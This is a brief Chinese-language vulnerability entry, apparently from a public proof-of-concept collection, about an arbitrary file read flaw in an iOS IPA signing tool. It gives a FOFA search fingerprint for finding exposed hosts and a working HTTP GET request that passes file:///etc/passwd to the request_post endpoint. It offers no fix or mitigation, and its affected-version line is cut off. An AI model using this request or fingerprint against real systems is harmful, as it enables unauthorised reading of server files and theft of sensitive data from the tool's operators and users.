---
fofa: "body="
source: "wy876 漏洞文库"
---

# 苹果IOS端IPA签名工具request_post任意文件读取漏洞

# 一、漏洞简介
苹果IOS端IPA签名工具request_post任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

# 二、影响版本
+ 苹果IOS端IPA签名工具r

# 三、资产测绘
+ fofa`body="/assets/index/css/mobileSelect.css"`
+ 特征


# 四、漏洞复现
```java
GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/haxm2dna8vo9em9h>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
